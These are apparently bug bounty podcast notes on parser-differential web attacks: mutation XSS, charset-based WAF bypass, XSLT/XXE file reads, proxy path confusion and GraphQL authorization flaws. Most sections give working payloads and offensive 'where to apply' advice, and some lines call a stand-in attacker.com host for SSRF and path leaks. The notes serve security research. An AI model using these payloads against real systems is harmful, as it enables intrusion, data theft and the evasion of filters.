# EP50: Mathias Karlsson - Client-Side Security Notes

## Metadata
- **Guest:** Mathias Karlsson (handle: `avlid`) -- Detectify co-founder, top live hacking event competitor
- **Host:** Justin Gardner (@rhynorater)
- **Date:** 2024
- **Episode:** Critical Thinking Bug Bounty Podcast, Episode 50

---

## Technique: Mutation XSS (mXSS) via HTML Parser Differentials

### How It Works

Mutation XSS exploits the gap between how a sanitizer parses HTML and how the browser's DOM rendering engine re-interprets it. The attack payload is *not* valid XSS on its own -- it becomes XSS only after the browser's "fix your bad markup" logic mutates it.

1. Attacker crafts malformed/non-spec-compliant HTML
2. HTML passes through a sanitizer (e.g., DOMPurify) which deems it safe
3. The browser's DOM parser (innerHTML assignment, DOMParser, etc.) attempts to "fix" the broken markup
4. The fix operation restructures the DOM tree, inadvertently creating an executable XSS context

```html
<!-- Example: Payload that is NOT XSS in raw form -->
<!-- But after browser mutation of broken nesting, becomes executable -->

<!-- Step 1: Attacker submits malformed HTML -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- Step 2: Sanitizer sees this as:
     - <math> context
     - <style> contains a comment "<!--" which swallows the <img>
     - Verdict: SAFE (no executable content visible) -->

<!-- Step 3: Browser DOM parser "fixes" the markup:
     - Realizes <table> can't be inside <mtext> in math context
     - Re-parents elements
     - The <style> tag's content gets re-interpreted as HTML
     - <img src=x onerror=alert(1)> is now a LIVE DOM element -->
```

**The critical flow:**

```
Attacker Payload (benign-looking)
        |
        v
+-------------------+
| HTML Sanitizer    |  <-- Sees nested tags as safe text
| (DOMPurify, etc.) |
+-------------------+
        |
        v  (payload passes through unchanged)
+-------------------+
| Browser DOM       |  <-- "Fixes" broken markup
| Parser/innerHTML  |  <-- Re-parents elements
+-------------------+
        |
        v
  XSS EXECUTES (alert fires)
```

### Why This Works

Different HTML parsers (server-side libraries, sanitizers, browsers) implement the HTML5 spec's error-recovery algorithms differently. When parser A says "this is safe text" but parser B restructures it into executable content, you get mXSS. The browser is especially aggressive about "fixing" malformed HTML because it has to render *something*.

Key areas where parsers disagree:
- HTML comment termination sequences (`--!>` vs `-->`)
- Foreign content contexts (math/svg namespace vs HTML namespace)
- Table foster-parenting rules
- How nested formatting elements are reconstructed

### Where To Apply This

- Any application using `innerHTML`, `outerHTML`, `document.write()` after server-side or client-side sanitization
- Targets using DOMPurify, Bleach, sanitize-html, or any HTML sanitizer
- Rich text editors, markdown renderers, email clients
- Any place user HTML goes through parse -> serialize -> re-parse cycles

### Tool: hackaplaneten (HTML Parser Differential Tool)

Mathias built and open-sourced a tool at `hackaplaneten.se` that runs input HTML through **16 different server-side HTML parsers** simultaneously and shows how each one interprets it. Each parser runs in its own Docker container.

```bash
# CLI usage -- pipe HTML into specific parser container
echo '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>' \
  | docker exec -i parser_beautifulsoup python3 parse.py

# Compare output across all 16 parsers to find differential behavior
# If parser X sees it differently than parser Y, you have a potential mXSS vector
```

**Use case for bug bounty:** If you identify which server-side parser a target uses, you can craft payloads that the parser sees as safe but the browser mutates into XSS.

---

## Technique: HTML Comment Parsing Differentials for Tag Hiding

### How It Works

Different parsers disagree on what terminates an HTML comment. This can be weaponized to hide tags from one parser (e.g., a sanitizer or WAF) while the downstream parser (e.g., the browser) sees them.

```html
<!-- Standard comment end: -->
<!-- Everything in here is a comment -->

<!-- Non-standard comment end that SOME parsers accept: --!> -->
<!-- Some parsers think this comment is still open --!>
<script>alert(1)</script>
<!-- But other parsers closed the comment at --!> and see the script -->
```

**The differential:**

```
+---------------------+     +---------------------+
| Parser A (filter)   |     | Parser B (renderer) |
|                     |     |                     |
| Sees --!> as NOT    |     | Sees --!> as valid  |
| closing the comment |     | comment terminator  |
| Everything after is |     | <script> tag is     |
| still "in comment"  |     | LIVE and EXECUTABLE |
| Verdict: SAFE       |     | Result: XSS         |
+---------------------+     +---------------------+
```

### Why This Works

The HTML5 spec has complex rules for comment parsing (involving multiple states in the tokenizer). Historical implementations and edge cases like `--!>`, `--!-->`, and other sequences are handled inconsistently. Mathias discovered this specifically while trying to hide XML tags from a parser that blocked certain tag names.

### Where To Apply This

- Bypass server-side HTML filters that strip dangerous tags
- Bypass WAFs that inspect HTML content
- Any scenario where HTML passes through multiple parsers in sequence
- XML/HTML hybrid contexts where comment syntax differs

---

## Technique: Charset/Encoding Manipulation for Filter Bypass

### How It Works

Character encoding differences between a filter/WAF and the backend application can be exploited to smuggle payloads. If the filter inspects bytes assuming one encoding but the server interprets them in another, dangerous characters become invisible to the filter.

**Approach 1: UTF-7 WAF Bypass**

```
# WAF checks for <script> in UTF-8/ASCII
# But if the server-side supports UTF-7:

# UTF-7 encoded <script>alert(1)</script>:
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

# WAF sees: harmless ASCII text (no angle brackets)
# Server decodes UTF-7: <script>alert(1)</script>
# Result: XSS
```

```
WAF (inspects as ASCII/UTF-8)          Backend (decodes as UTF-7)
        |                                       |
        v                                       v
"+ADw-script+AD4-alert(1)"             "<script>alert(1)</script>"
  = harmless text, PASS                  = EXECUTABLE XSS
```

**Approach 2: UTF-16 Null Byte Smuggling**

```
# In UTF-16, the '<' character (0x3C) is represented as 0x003C
# A byte-level filter checking for 0x3C in ASCII mode:

Filter logic (byte scan):
  0x00 -- not 0x3C, PASS
  0x3C -- IS 0x3C, but preceded by 0x00, filter may see it as
          part of a multi-byte char and skip it

# Mathias used this technique to read files with null bytes:
# /proc/self/environ is null-separated
# Parser rejects null bytes in output
# Solution: tell parser to read file as UTF-16
# Null bytes become part of valid multi-byte characters
# Output appears as Chinese/CJK characters
# Decode back to get the original data
```

**Approach 3: Byte Order Mark (BOM) Injection**

```
# BOM bytes define endianness of multi-byte encodings
# UTF-16 BE BOM: 0xFE 0xFF
# UTF-16 LE BOM: 0xFF 0xFE

# If injected at the start of user-controlled data:
# The parser may switch its interpretation of ALL subsequent bytes

# Theoretical attack:
# 1. Data field expected to be UTF-8
# 2. Inject BOM at start: \xFF\xFE (UTF-16 LE marker)
# 3. Parser switches to UTF-16 LE interpretation
# 4. All subsequent bytes are now read as 2-byte pairs
# 5. Completely different characters emerge
# 6. Security filters that checked the UTF-8 version are bypassed
```

**Approach 4: Mid-Stream Encoding Switches**

```
# Some encodings support in-band signaling to switch encoding mid-stream
# ISO-2022-JP is a notable example:

# ESC $ B  -> switch to JIS X 0208 (Japanese)
# ESC ( B  -> switch back to ASCII

# Attack concept:
# 1. Start payload in ASCII (filter sees normal text)
# 2. Insert escape sequence to switch encoding
# 3. Subsequent bytes interpreted differently
# 4. Insert escape sequence to switch back
# 5. Filter saw garbage; backend decoded Japanese chars
#    that normalize to dangerous characters
```

### Why This Works

- WAFs and filters typically inspect bytes assuming a single encoding (usually UTF-8/ASCII)
- Backend applications may support or auto-detect different encodings
- The same bytes represent completely different characters in different encodings
- ASCII (0x00-0x7F) is shared across most encodings, but encodings diverge above 0x7F
- Some encodings (UTF-7, ISO-2022-JP) use escape sequences that ASCII-based filters cannot detect

### Where To Apply This

- WAF bypass (most WAFs are weak at multi-encoding support)
- Content-Type charset parameter manipulation
- File upload processing where encoding is auto-detected
- Server-side XML/HTML parsing where charset can be declared in the document
- Any multi-tier architecture where each tier may decode differently
- Host header injection (as demonstrated in Justin's DEF CON talk using ISO-8859-1 Q-encoded host headers to bypass NGINX filtering)

---

## Technique: XSLT Transform Exploitation (Parser Chaining to XSS/XXE)

### How It Works

XSLT (Extensible Stylesheet Language Transformations) can transform XML documents into other formats, including HTML. If an attacker controls the XSLT stylesheet, they can transform benign XML into malicious HTML containing XSS, or leverage XSLT's file-reading capabilities for data exfiltration.

```xml
<!-- Attacker-controlled XSLT that transforms XML into XSS -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <!-- Transform ANY input XML into an HTML page with XSS -->
    <html>
      <body>
        <script>alert(document.domain)</script>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>

<!-- XSLT can also read files from the filesystem -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <!-- Read /etc/passwd via document() function -->
    <xsl:value-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Mathias's real-world chain:**

```
1. Application accepts XML upload
   |
   v
2. Separate input accepts XSLT document
   |
   v
3. XSLT document is ALSO specified as XML
   |                    |
   v                    v
4. Original XML doc     XSLT doc itself was
   NOT vulnerable       vulnerable to XXE!
   to XXE               (different parser path)
   |
   v
5. XXE in XSLT doc -> read files from filesystem
   |
   v
6. /proc/self/environ contains null bytes -> parser rejects
   |
   v
7. BYPASS: Specify file encoding as UTF-16 in XSLT read operation
   |
   v
8. Null bytes become part of valid UTF-16 characters (CJK output)
   |
   v
9. Decode UTF-16 CJK characters back -> original env vars extracted
```

```
    XML Input              XSLT Stylesheet Input
        |                          |
        v                          v
  +----------+              +----------+
  | XML      |              | XML      |
  | Parser 1 |              | Parser 2 | <-- XXE HERE (different parser!)
  | (safe)   |              | (vuln)   |
  +----------+              +----------+
        |                          |
        +----------+---------------+
                   |
                   v
           +---------------+
           | XSLT Engine   |
           | Transforms    |
           | XML using     |
           | stylesheet    |
           +---------------+
                   |
                   v
            Output (HTML/text)
            Can contain XSS or
            exfiltrated file data
```

### Why This Works

- XSLT is a powerful language that can read files, access environment variables, and transform documents
- Different XSLT libraries (libxslt, Saxon, Xalan) have different capabilities and security defaults
- The XSLT stylesheet is itself an XML document, so it may be processed by a *different* XML parser than the data document
- Developers often secure the primary XML input but forget the XSLT input is also XML and needs the same protections
- The encoding trick works because XSLT file-reading functions allow specifying the target file's encoding

### Where To Apply This

- Applications that accept XML + XSLT (document conversion, PDF generation, report builders)
- SAML implementations that use XSLT transforms
- Any XML processing pipeline where both data and transform are user-controllable
- Look for XXE in the XSLT document even when the primary XML input is hardened

---

## Technique: Reverse Proxy Path Confusion / Secondary Context Bugs

### How It Works

When multiple servers (load balancer, reverse proxy, application server) interpret the same HTTP request path differently, attackers can access unintended backend routes, bypass access controls, or achieve SSRF.

**Fragment/Hash Truncation:**

```
# Frontend proxy sees the full path (treats # as part of path):
GET /api/v1/public#/../admin/secret HTTP/1.1

# Backend server treats # as fragment delimiter:
# Path becomes: /api/v1/public  (everything after # is dropped)

# OR the opposite -- frontend drops fragment, backend keeps it
# Result: path routing mismatch -> access control bypass
```

```
Client Request: GET /static/../admin/users HTTP/1.1
                            |
                            v
+----------------------------+
| Frontend (NGINX)           |
| Normalizes: /admin/users   |
| Rule: /admin/* -> DENY     |
| BLOCKED                    |
+----------------------------+

# But with encoding tricks:
Client Request: GET /static/..%2fadmin/users HTTP/1.1
                            |
                            v
+----------------------------+
| Frontend (NGINX)           |
| Sees: /static/..%2fadmin/  |
| Rule: /static/* -> ALLOW   |  <-- No match on /admin/*
| PASSES THROUGH             |
+----------------------------+
                            |
                            v
+----------------------------+
| Backend (Node/Java/etc)    |
| Decodes: /static/../admin/ |
| Normalizes: /admin/users   |
| SERVES ADMIN PAGE          |
+----------------------------+
```

**Host Header SSRF via Port Injection:**

```http
# Normal request:
GET / HTTP/1.1
Host: target.com

# Attack -- inject a second host via port field:
GET / HTTP/1.1
Host: target.com:80@attacker.com

# Some parsers treat the part after @ as the actual host
# The proxy routes the request to attacker.com
# This is SSRF via host header manipulation
```

**Techniques for enumerating the backend path (what's appended after your injection):**

```
# 1. Path traversal to discover document root depth:
GET /api/../../../../etc/passwd HTTP/1.1
# 400 = traversed past root (too many ../)
# 200/404 = still within server path space
# Binary search the number of ../ to find exact depth

# 2. URI length inflation to trigger 414 (URI Too Long):
GET /api/AAAA....[thousands of A's]....AAAA HTTP/1.1
# If you know the LEFT side length and the 414 threshold,
# you can calculate the RIGHT side (appended path) length

# 3. Query parameter injection for error messages:
GET /api?invalidparam=<garbage> HTTP/1.1
# Backend might return: "Invalid parameter 'invalidparam' for /api/internal/path"
# Leaks the full internal path including appended suffix

# 4. SSRF hail mary for full path disclosure:
GET /static@attacker.com/ HTTP/1.1
# If the proxy constructs: http://backend/static@attacker.com/suffix
# Your server logs reveal the full path including /suffix
```

### Why This Works

- HTTP path parsing is not standardized across implementations
- URL encoding/decoding happens at different stages in different servers
- Fragment identifiers (#), query strings (?), path parameters (;) are handled inconsistently
- Reverse proxies often reconstruct requests before forwarding, introducing normalization gaps
- The host header's port field parsing is loosely implemented, allowing injection of `@` credentials syntax

### Where To Apply This

- Any multi-tier web architecture (CDN -> LB -> proxy -> app)
- NGINX, Apache, HAProxy, Envoy, Traefik configurations
- Cloud WAF + origin server setups
- Kubernetes ingress controllers
- Path-based routing rules in any reverse proxy

---

## Technique: Headless Browser DNS/Network Log Auditing for Subdomain Takeovers

### How It Works

When running headless browsers for reconnaissance (screenshots, crawling), you can passively audit all DNS resolutions and network requests to find dangling references to domains that can be taken over.

```
Standard recon workflow:
  Headless browser -> visit target -> take screenshot -> done

Enhanced workflow (Mathias's tip):
  Headless browser -> visit target -> take screenshot
                                   -> ALSO capture all DNS queries
                                   -> ALSO capture all network requests
                                   -> Check each external domain:
                                      - Does the domain exist?
                                      - Is it expired/available for purchase?
                                      - Does it point to a service with takeover potential?
```

```
Visit https://target.com/dashboard
        |
        v
Browser loads page, which references:
  - <script src="https://old-analytics.com/tracker.js">
  - <img src="https://defunct-cdn.com/logo.png">
  - <link href="https://expired-vendor.com/styles.css">
        |
        v
DNS resolution log reveals:
  old-analytics.com    -> NXDOMAIN (domain expired!)
  defunct-cdn.com      -> CNAME -> d1234.cloudfront.net (dangling!)
  expired-vendor.com   -> available for purchase ($12)
        |
        v
Register expired-vendor.com -> serve malicious CSS/JS
Claim dangling CloudFront distribution -> serve malicious content
Result: XSS via subdomain takeover on target.com
```

### Why This Works

Web pages make dozens of external resource requests (scripts, stylesheets, images, fonts, tracking pixels, iframes). Over time, some of these external domains expire, services get decommissioned, or CNAME records dangle. The resources may not be on the main page (`/`) but on internal pages, admin panels, or specific routes. Headless browser recon naturally visits these pages -- you just need to capture the DNS/network data that is already being resolved.

### Where To Apply This

- Integrate into any existing headless browser recon pipeline
- Audit DNS logs and HTTP request logs from Puppeteer/Playwright/Selenium
- Check referenced domains against domain registrars for availability
- Check CNAME records for dangling pointers to cloud services (S3, CloudFront, Azure, Heroku, GitHub Pages)
- Look beyond just the homepage -- internal authenticated pages often have older, unmaintained references

---

## Technique: WAF Bypass via Content-Encoding Header Confusion

### How It Works

WAFs that inspect request/response bodies often rely on being able to decode the content. If you specify an unusual or unexpected `Content-Encoding` header, some WAFs will simply pass the request through uninspected.

```http
# Normal request (WAF inspects body, blocks XSS):
POST /api/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

comment=<script>alert(1)</script>
# WAF: BLOCKED (detected <script> tag)

# Bypass -- add Content-Encoding header:
POST /api/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Encoding: gzip

comment=<script>alert(1)</script>
# WAF: "I don't know how to decode this, pass it through"
# Backend: ignores Content-Encoding on request, processes body as-is
# Result: XSS payload reaches application
```

### Why This Works

WAFs are inline proxies that must make fast pass/block decisions. When they encounter encoding they cannot handle, many fail open (pass through) rather than fail closed (block). The backend application server may simply ignore the Content-Encoding header on requests or handle it differently.

### Where To Apply This

- Any target behind a cloud WAF (Cloudflare, Akamai, AWS WAF, Imperva)
- Combine with charset tricks (UTF-7, ISO-2022-JP) for layered bypass
- Test with various Content-Encoding values: gzip, br, deflate, compress, identity, and arbitrary strings
- Reference: Soroush Dalili's charset-based WAF bypass research (2018)

---

## Technique: GraphQL Subscription Abuse via WebSocket/Multipart-Mixed

### How It Works

GraphQL supports three operation types: queries, mutations, and **subscriptions**. Subscriptions maintain a persistent connection (via WebSocket or HTTP multipart/mixed response) that streams data to the client whenever the subscribed event occurs. This is an often-overlooked attack surface.

```graphql
# Standard GraphQL query (one-shot):
query {
  user(id: "123") {
    email
    name
  }
}

# Subscription (persistent, streams data):
subscription {
  newMessage {
    id
    content
    sender {
      id
      email        # <-- Can you access fields you shouldn't?
      passwordHash # <-- Does authz apply to subscription resolvers?
    }
  }
}
```

**Multipart/Mixed HTTP Response (used by Apollo GraphQL for subscriptions):**

```http
HTTP/1.1 200 OK
Content-Type: multipart/mixed; boundary="-"

---
Content-Type: application/json

{"data": {"newMessage": {"id": "1", "content": "hello"}}}
---
Content-Type: application/json

{"data": {"newMessage": {"id": "2", "content": "world"}}}
---
# Stream continues as long as connection is open
# Each part is a separate JSON response
```

### Why This Works

- Subscriptions often have weaker authorization checks than queries/mutations
- The persistent connection model means data flows *to* the attacker without repeated requests
- Multipart/mixed responses are an unusual HTTP pattern that security tools may not inspect properly
- Response header injection in multipart contexts could allow injecting additional response parts

### Where To Apply This

- Any GraphQL API that supports subscriptions (check schema for `type Subscription`)
- Test subscription resolvers for authorization bypasses independently from query/mutation resolvers
- Look for multipart/mixed response handling in HTTP proxies and WAFs (potential smuggling vector)
- Apollo GraphQL implementations are a primary target for multipart/mixed transport

---

## Technique: GraphQL Nested Type Traversal for Data Exfiltration

### How It Works

GraphQL's type system allows objects to reference other objects. By following these references through nested sub-selections, you can traverse the entire data graph and access fields that were never intended to be exposed through the original query entry point.

```graphql
# Start with an innocuous query:
query {
  myProfile {
    name
    contacts {           # <-- contacts returns a ContactType
      user {             # <-- ContactType has a user field (UserType)
        email
        role
        organization {   # <-- UserType links to OrganizationType
          billing {      # <-- OrgType links to BillingType
            creditCard   # <-- Sensitive data exposed through traversal!
          }
          members {      # <-- OrgType has members (list of UserType)
            passwordResetToken  # <-- Exposed!
            passwordHash        # <-- Exposed!
          }
        }
      }
    }
  }
}
```

```
Entry point: myProfile (authorized)
        |
        v
    contacts[] (authorized - my own contacts)
        |
        v
    user (each contact's user object)
        |
        v
    organization (user's org -- am I authorized?)
        |
        v
    billing / members (sensitive data -- likely NO authz check)
        |
        v
  IDOR via graph traversal -- access other users' PII,
  password hashes, billing info, reset tokens
```

### Why This Works

- GraphQL resolvers often check authorization at the top-level query/mutation but not on nested type resolvers
- The type system exposes the entire data model -- introspection shows you exactly how types connect
- Developers think in terms of "which queries can users access" but forget that a query's return type can link to ANY other type in the schema
- Field-level authorization is complex to implement and often incomplete

### Where To Apply This

- Enable introspection or use schema-guessing tools to map the full type graph
- Use GraphQL visualization tools to see type relationships
- Test every nested object field for authorization -- does accessing `user.organization.members` check if YOU should see those members?
- Look for sensitive fields on types that are reachable through multiple paths
- Chain subqueries to reach admin-only types through user-accessible entry points

---

## Technique: Anti-Scraping via Parser Differential (Defensive Application)

### How It Works

Mathias applied his parser differential knowledge defensively on his personal website (`avlidinbrunn.se`). By exploiting the same HTML comment/tag parsing differences that enable mXSS, he hid links and content from automated scrapers while keeping them visible to real browsers.

```html
<!-- Content that Beautiful Soup / Floki / other scrapers cannot extract -->
<!-- But browsers render correctly -->

<!-- The page uses malformed HTML constructs that: -->
<!-- 1. Server-side parsers (Beautiful Soup, lxml, Floki) misinterpret -->
<!--    They think content is inside a comment or hidden element -->
<!-- 2. Browsers correctly render (they have the most robust error recovery) -->

<!-- Practical implication for security: -->
<!-- If scrapers can't parse your page, automated tools that -->
<!-- extract URLs, emails, API keys from pages will miss them -->
```

### Where To Apply This (Offensively)

- If a target's security scanner/WAF uses server-side HTML parsing to inspect responses, the same differential can hide malicious content from it
- Payload delivery that is invisible to automated security scanners but visible to the victim's browser

---

## Key Quotes

> "Mutation XSS is like, if you take a payload and just give it to the browser, no alert box will pop. But if you put it through some parser first, it will essentially try to fix errors in the markup. And while inserting those fixes, it actually turns it into XSS." -- Mathias Karlsson

> "If you're gonna do headless browser stuff, like for screenshots for example, then you might as well audit the network logs or the DNS logs, because I've seen a lot of places where people make some kind of external resource request to a domain that either has a takeover or that's just like, you can just buy the domain." -- Mathias Karlsson

> "There's also some encodings that have a special sequence of characters that transform it. So in the middle of the document you can have bytes that tell it to switch to another way of interpreting, and it ends with something else. So you can have encodings which say: now it's standard ASCII, everything's fine... no, now it is not. Now it's this other thing." -- Mathias Karlsson

> "If the server side supports UTF-7, but the WAF doesn't, just send it in that encoding and the WAF won't see it." -- Mathias Karlsson

> "A lot of times what I see is that the first load balancer or whatever is like okay that's just a part of the path, but then when it forwards it to the backend, the path is cut off. So that's a good tip if you need a way to truncate the rest of the path because maybe there's some reverse proxy match so you need to have a suffix." -- Mathias Karlsson (on fragment character `#` in paths)

> "One time at least I've seen you can do like `Host: example.com:80@attacker.com` and you'll have an SSRF." -- Mathias Karlsson

> "I like type confusion bugs. They are one of my favorites. And encoding is like a broad area within that." -- Mathias Karlsson

---

## Master Summary Table

| # | Technique | Type | Impact | Complexity |
|---|-----------|------|--------|------------|
| 1 | Mutation XSS (mXSS) via parser differentials | DOM XSS | Stored/Reflected XSS bypassing sanitizers | High |
| 2 | HTML comment parsing differentials for tag hiding | Filter Bypass / XSS | XSS, WAF bypass, tag injection past sanitizers | Medium-High |
| 3 | Charset/encoding manipulation (UTF-7, UTF-16, BOM, ISO-2022-JP) | WAF Bypass / XSS | WAF bypass, filter evasion, XSS, data exfiltration | Medium-High |
| 4 | XSLT transform exploitation (XXE + encoding bypass) | XXE / XSS / File Read | File read, env var exfil, SSRF, potential RCE | High |
| 5 | Reverse proxy path confusion / secondary context | Access Control Bypass / SSRF | Path traversal, auth bypass, SSRF | Medium |
| 6 | Host header port injection for SSRF | SSRF | Internal service access, request routing manipulation | Medium |
| 7 | Fragment character (`#`) path truncation | Path Confusion | Access control bypass, route manipulation | Low-Medium |
| 8 | Headless browser DNS/network log auditing | Subdomain Takeover / XSS | Script injection via dangling domains, subdomain takeover | Low |
| 9 | WAF bypass via Content-Encoding confusion | WAF Bypass | Deliver any payload past WAF | Low |
| 10 | GraphQL subscription abuse (WebSocket/multipart-mixed) | Authorization Bypass | Data streaming, potential real-time data exfil | Medium |
| 11 | GraphQL nested type traversal | IDOR / Data Exfiltration | Access sensitive fields through object graph traversal | Medium |
| 12 | URI length inflation for backend path enumeration | Information Disclosure | Determine hidden backend path length via 414 responses | Low |
| 13 | Anti-scraping parser differentials (defensive/offensive) | Filter Evasion | Hide content from security scanners, deliver hidden payloads | Medium |

---

## Resources & References

- **hackaplaneten.se** -- Mathias's HTML parser differential tool (16 parsers, open source, Docker-based)
- **avlidinbrunn.se** -- Mathias's personal site (demonstrates anti-scraping via parser differentials)
- **Soroush Dalili's WAF bypass research (2018)** -- Charset-based WAF bypass techniques
- **James Kettle - "Exploiting HTTP's Hidden Attack Surface"** -- Host header attacks, request smuggling (PortSwigger)
- **"Everything You Need to Know About Encodings and Charsets as a Developer"** -- Referenced blog post on encoding fundamentals (historical, linked by Mathias)
- **Chromium source code** -- Full list of supported character encodings in browsers
- **PortSwigger XSS Cheat Sheet** -- Reference for "impossible" XSS scenarios and minimal blocking rules
- **Mathias's talk: "How to Differentiate Yourself as a Bug Bounty Hunter"** -- Covers data retention, collaboration, and bounty effectiveness formula
- **BountyDash** -- Mathias and Frans's bounty tracking dashboard tool
- **Midnight Sun CTF** -- Swedish CTF where Mathias builds challenges (including DynamoDB injection challenges)
